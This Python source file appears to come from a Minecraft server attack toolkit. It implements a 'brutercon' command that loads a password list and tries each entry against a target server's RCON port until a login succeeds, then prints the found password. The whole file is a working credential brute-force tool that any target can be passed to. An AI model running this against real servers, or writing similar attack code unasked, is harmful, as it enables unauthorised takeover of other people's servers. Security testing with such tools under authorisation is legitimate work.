import os

from loguru import logger
from mccolors import mcwrite
from mcrcon import MCRcon, MCRconException

from mcptool.commands.arguments.argument_validator import ValidateArgument
from mcptool.utilities.language.utilities import LanguageUtils as Lm


class Command:
    @logger.catch
    def __init__(self):
        self.passwords: list = []
        self.name: str = 'brutercon'
        self.command_arguments: list = [i for i in Lm.get(f'commands.{self.name}.arguments')]
        logger.debug(f"Command initialized: {self.name}, arguments: {self.command_arguments}")

    @logger.catch
    def validate_arguments(self, user_arguments: list) -> bool:
        """
        Method to validate the arguments
        :param user_arguments: list: The arguments to validate
        :return: bool: True if the arguments are valid, False otherwise
        """
        if not ValidateArgument.validate_arguments_length(
                command_name=self.name,
                command_arguments=self.command_arguments,
                user_arguments=user_arguments
        ):
            return False

        if not ValidateArgument.is_ip_and_port(user_arguments[0]):
            mcwrite(Lm.get('errors.invalidIpAndPort'))
            return False

        if not os.path.exists(user_arguments[1]):
            mcwrite(Lm.get('errors.invalidFile'))
            return False

        return True

    @logger.catch
    def execute(self, user_arguments: list) -> bool:
        """
        Method to execute the command
        :param user_arguments: list: The arguments to execute the command
        """
        if not self.validate_arguments(user_arguments):
            return False

        # Save user arguments
        ip_address: str = user_arguments[0].split(':')[0]
        port: str = user_arguments[0].split(':')[1]
        password_file: str = user_arguments[1]

        # Getting the passwords
        mcwrite(Lm.get(f'commands.{self.name}.gettingPasswords').replace('%file%', password_file))

        with open(password_file, 'r') as file:
            self.passwords = file.read().splitlines()

        # Check if the password file is empty
        if len(self.passwords) == 0:
            mcwrite(Lm.get(f'errors.passwordFileEmpty'))
            return False

        # Start brute forcing to the rcon
        mcwrite(Lm.get(f'commands.{self.name}.bruteForcing')
                .replace('%ip%', f'{ip_address}:{port}')
                .replace('%passwordFile%', password_file)
                .replace('%passwords%', str(len(self.passwords)))
                )

        for rcon_password in self.passwords:
            rcon_password = rcon_password.replace('\n', '')  # Remove the newline character

            try:
                with MCRcon(host=ip_address, password=rcon_password, port=int(port), timeout=30) as mcr:
                    mcwrite(Lm.get(f'commands.{self.name}.passwordFound')
                            .replace('%password%', rcon_password)
                            )
                    return True

            except TimeoutError:
                mcwrite(Lm.get('errors.rconTimeout'))

            except ConnectionRefusedError:
                mcwrite(Lm.get('errors.rconConnectionRefused'))

            except MCRconException:
                mcwrite(Lm.get('errors.rconConnectionRefused'))

            except Exception as e:
                mcwrite(Lm.get('errors.rconUnknownError'))
                logger.error(f'Error in brutercon command: {e}')

        mcwrite(Lm.get(f'commands.{self.name}.passwordNotFound'))
        return True
